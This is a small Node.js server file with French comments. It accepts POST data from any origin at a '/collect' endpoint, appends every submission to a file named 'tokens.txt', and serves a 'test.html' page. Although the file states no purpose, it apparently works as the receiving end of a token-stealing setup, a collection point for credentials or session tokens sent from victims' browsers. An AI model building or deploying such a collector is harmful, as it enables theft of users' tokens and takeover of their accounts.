const http = require('http');
const fs = require('fs');
const path = require('path');

const server = http.createServer((req, res) => {
    // Ajouter en-tête CORS pour accepter toutes les origines
    res.setHeader('Access-Control-Allow-Origin', '*');

    if (req.method === 'POST' && req.url === '/collect') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            console.log('Données reçues :', body);
            fs.appendFileSync('tokens.txt', body + '\n');
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: 'success' }));
        });
    } else if (req.method === 'GET' && req.url === '/') {
        // Servir test.html sur la racine
        const filePath = path.join(__dirname, 'test.html');
        fs.readFile(filePath, (err, content) => {
            if (err) {
                res.writeHead(500);
                res.end('Erreur serveur');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(content);
        });
    } else {
        res.writeHead(404);
        res.end('Page non trouvée');
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Serveur en écoute sur le port ${PORT}`);
});